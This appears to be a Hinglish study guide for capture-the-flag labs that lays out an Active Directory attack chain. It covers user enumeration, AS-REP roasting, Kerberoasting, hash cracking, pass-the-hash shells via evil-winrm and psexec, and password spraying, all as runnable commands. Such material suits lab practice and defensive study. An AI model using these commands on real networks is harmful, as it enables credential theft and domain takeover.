# RECON SE DOMAIN ADMIN TAK — Active Directory Attack Chain

---

## Active Directory (AD) Kya Hai?
Active Directory Microsoft ka directory service hai jo companies mein use hota hai.
Ek central server (Domain Controller / DC) saare users, computers, aur permissions manage
karta hai. Jaise school mein principal ke paas saare students ki list hoti hai.

**Key Terms Samjho:**
- **Domain Controller (DC):** Boss server jo authentication handle karta hai
- **Domain Admin (DA):** Sabse powerful user — poore network ka admin
- **Kerberos:** Authentication protocol (tickets use karta hai, jaise movie ticket)
- **NTLM:** Older authentication (hash-based)
- **SPN (Service Principal Name):** Services ki unique identity
- **TGT (Ticket Granting Ticket):** Kerberos ki "master ticket" — isse aur tickets milte hain
- **TGS (Ticket Granting Service):** Specific service ke liye ticket

**Attack Flow:**
Enumerate → Find Users → Get Hashes (AS-REP/Kerberoast) → Crack → Login → DA

---

## PHASE 1: DOMAIN ENUMERATE KARO — Pehle Samjho Environment

### Basic Domain Info:
```bash
# Domain name, DC name, users, shares — sab ek command se:
enum4linux -a <DC_IP>

# SMB se OS aur domain info:
crackmapexec smb <DC_IP>
# Output: SMB  445  DC01  [*] Windows Server 2019  (domain:CORP.LOCAL)

# Nmap se bhi:
nmap --script smb-os-discovery -p 445 <DC_IP>
```

### LDAP Enumeration (Agar anonymous bind allowed):
```bash
# Base DN find karo:
ldapsearch -x -H ldap://<DC_IP> -s base namingContexts
# Output: dc=corp,dc=local

# Users list:
ldapsearch -x -H ldap://<DC_IP> -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName
```
**`-x` = Simple authentication, `-H` = LDAP server URL, `-b` = Base DN (search start point)**

### enum4linux Output Mein Kya Dekh:
```
[+] Domain Name: CORP
[+] Domain SID: S-1-5-21-...
[+] Users: administrator, svc_sql, j.smith, k.doe
[+] Password Policy: Minimum length: 7, Lockout threshold: 5
```
- **User names note karo** — ye brute force aur AS-REP Roasting mein chahiye
- **Password policy** — lockout threshold se zyada attempts mat karna!

---

## PHASE 2: USER ENUMERATION — Kaun Kaun Hai Domain Mein

### Kerbrute (Best for Username Enumeration):
```bash
kerbrute userenum -d corp.local --dc <DC_IP> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```
**Kerbrute kyu best hai:** Ye Kerberos pre-authentication use karta hai. Valid username pe
different error aata hai (KDC_ERR_PREAUTH_REQUIRED) invalid se (KDC_ERR_C_PRINCIPAL_UNKNOWN).
Account lockout bhi nahi hota!

**Output:**
```
2024/01/15 10:23:45 >  [+] VALID USERNAME:  administrator@corp.local
2024/01/15 10:23:46 >  [+] VALID USERNAME:  svc_sql@corp.local
2024/01/15 10:23:47 >  [+] VALID USERNAME:  j.smith@corp.local
```

### RPCClient (Agar null session allowed):
```bash
rpcclient -U "" -N <DC_IP>
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> queryuser 500          # RID 500 = Administrator
rpcclient $> querygroupmem 512      # RID 512 = Domain Admins
```
**`-U ""` = Empty username, `-N` = No password (null session)**

### CrackMapExec:
```bash
crackmapexec smb <DC_IP> -u '' -p '' --users
# Null credentials se user enumeration
```

---

## PHASE 3: AS-REP ROASTING — Bina Password Jaane Hash Lo

### AS-REP Roasting Kya Hai? (Detail Mein Samjho)
Normal Kerberos mein jab tu authenticate hota hai:
1. Tu DC ko bolta hai "mujhe ticket do" (AS-REQ)
2. DC pehle check karta hai ki tu sach mein wo user hai (Pre-Authentication)
3. Pre-auth mein tera password hash se encrypted timestamp bhejta hai
4. DC verify karta hai, phir TGT deta hai (AS-REP)

**LEKIN** agar kisi user pe "Do not require Kerberos pre-authentication" enable hai:
- DC bina pre-auth ke seedha TGT de deta hai (AS-REP)
- Ye AS-REP user ke password hash se encrypted hota hai
- Tu isko offline crack kar sakta hai!

### Step 1: AS-REP Roastable Users Dhundho
```bash
# Agar tere paas users ki list hai:
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip <DC_IP>

# Agar tere paas koi valid credentials hain:
impacket-GetNPUsers corp.local/j.smith:Password123 -dc-ip <DC_IP>
```

### Output:
```
$krb5asrep$23$svc_sql@CORP.LOCAL:0a4b8c3d...long_hash...
```
Ye hash hai — isko crack karna hai!

### Step 2: Hash Crack Karo
```bash
# Hashcat (FAST — GPU use karta hai):
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
# -m 18200 = AS-REP hash mode

# John (CPU based):
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hash.txt
john --show asrep_hash.txt
```

---

## PHASE 4: KERBEROASTING — Service Account Ke Hashes Lo

### Kerberoasting Kya Hai? (Detail Mein Samjho)
Jab tere paas domain mein koi bhi valid credentials hon (low-privilege bhi chalega):
1. Tu DC se bolta hai "mujhe XYZ service ka ticket do" (TGS-REQ)
2. DC tujhe TGS ticket deta hai — ye **service account ke password hash** se encrypted hai
3. Tu ye ticket offline crack kar sakta hai
4. Service accounts mein aksar weak passwords hote hain (ya kabhi change nahi hue)

### Ye AS-REP Se Different Kyu Hai?
- **AS-REP Roasting:** Kisi bhi creds ki zaroorat NAHI, lekin user pe pre-auth disabled chahiye
- **Kerberoasting:** Koi bhi valid creds chahiye, lekin KISI BHI service account ka hash mil sakta hai

### Step 1: SPN Wale Users Dhundho Aur Hash Lo
```bash
impacket-GetUserSPNs corp.local/j.smith:Password123 -dc-ip <DC_IP> -request
```

### Output:
```
ServicePrincipalName  Name      MemberOf
--------------------  --------  --------
MSSQL/dc01.corp.local svc_sql   CN=Domain Admins

$krb5tgs$23$*svc_sql$CORP.LOCAL$..._long_hash...
```
**Dekh:** svc_sql Domain Admins mein hai — iska password crack hua toh DA mil gaya!

### Step 2: TGS Hash Crack Karo
```bash
# Hashcat:
hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
# -m 13100 = Kerberoast TGS hash mode

# John:
john --wordlist=/usr/share/wordlists/rockyou.txt tgs_hash.txt
```

---

## PHASE 5: CREDENTIALS USE KARO — Login & Lateral Movement

### CrackMapExec Se Verify (Creds kaam kar rahe ya nahi):
```bash
# Password se:
crackmapexec smb <DC_IP> -u svc_sql -p 'CrackedPassword123'
# [+] = Success    Pwn3d! = Admin access!

# Hash se (agar crack nahi hua):
crackmapexec smb <DC_IP> -u Administrator -H <NTLM_HASH>
```

### Evil-WinRM Se Shell (Port 5985 open chahiye):
```bash
# Password se:
evil-winrm -i <DC_IP> -u svc_sql -p 'CrackedPassword123'

# Hash se:
evil-winrm -i <DC_IP> -u Administrator -H <NTLM_HASH>
```
**Evil-WinRM kya hai:** Windows Remote Management se PowerShell shell deta hai

### PsExec Se Shell (Port 445 se):
```bash
# Impacket:
impacket-psexec corp.local/svc_sql:'CrackedPassword123'@<DC_IP>

# Hash se:
impacket-psexec corp.local/Administrator@<DC_IP> -hashes :<NTLM_HASH>
```

### WMIExec (Alternative):
```bash
impacket-wmiexec corp.local/svc_sql:'CrackedPassword123'@<DC_IP>
```

---

## PHASE 6: DOMAIN ADMIN CONFIRM KARO + FLAG

### DA Confirm Commands:
```cmd
whoami
# corp\administrator ya corp\svc_sql

whoami /groups
# "Domain Admins" group mein hona chahiye

net user administrator /domain
# Account details

net group "Domain Admins" /domain
# Domain Admins list
```

### Flag Dhundho:
```cmd
type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\proof.txt
dir /s /b C:\*flag*
dir /s /b C:\*proof*
```

---

## BONUS: Agar Koi Bhi Method Se Direct DA Na Mile

### Password Spray (Ek Password, Bahut Users):
```bash
crackmapexec smb <DC_IP> -u users.txt -p 'Password123' --continue-on-success
# Common passwords try karo: Season+Year (Summer2024), Company+123, Welcome1
```
**Careful:** Lockout policy check karo pehle — 5 se zyada attempts pe account lock ho sakta hai

### BloodHound (Attack Path Visualization):
```bash
# Data collect karo:
bloodhound-python -d corp.local -u j.smith -p Password123 -ns <DC_IP> -c all
# BloodHound mein import karo — shortest path to DA dikhayega
```

---

## Common Mistakes (Mat Karna Ye)

1. **Domain name galat daalna** — `enum4linux` ya `crackmapexec` se pehle confirm karo
2. **Kerbrute mein `-d` flag miss karna** — Domain name zaroori hai
3. **AS-REP aur Kerberoast confuse karna** — AS-REP = no creds needed, Kerberoast = creds needed
4. **Password spray mein lockout** — Policy check karo: `crackmapexec smb <DC_IP> --pass-pol`
5. **Hash format galat** — Hashcat mein `-m 18200` (AS-REP) aur `-m 13100` (Kerberoast) alag hai
6. **Evil-WinRM use karna jab port 5985 band ho** — Pehle nmap se check karo
7. **impacket tools mein domain\ format** — `domain/user:password` use karo, `domain\user` nahi

---

## Quick Decision Tree

```
AD Environment mila (port 88/389/445 open)
  |
  +-- enum4linux -a <DC_IP> --> Domain info + users
  +-- kerbrute userenum --> valid usernames list
  |
  +-- Koi creds NAHI hain:
  |     +-- AS-REP Roasting: GetNPUsers -no-pass -usersfile users.txt
  |     +-- Hash mila? --> hashcat -m 18200 --> password crack
  |     +-- Password spray: crackmapexec -u users.txt -p 'Password123'
  |
  +-- Low-privilege creds HAIN:
  |     +-- Kerberoasting: GetUserSPNs -request
  |     +-- TGS hash mila? --> hashcat -m 13100 --> password crack
  |
  +-- Admin/DA creds mile:
  |     +-- evil-winrm -i <DC_IP> -u user -p pass (port 5985)
  |     +-- impacket-psexec domain/user:pass@<DC_IP> (port 445)
  |     +-- Pass-the-Hash agar sirf hash hai
  |
  +-- DA shell mila:
        +-- whoami /groups --> "Domain Admins" confirm
        +-- type C:\Users\Administrator\Desktop\flag.txt
```
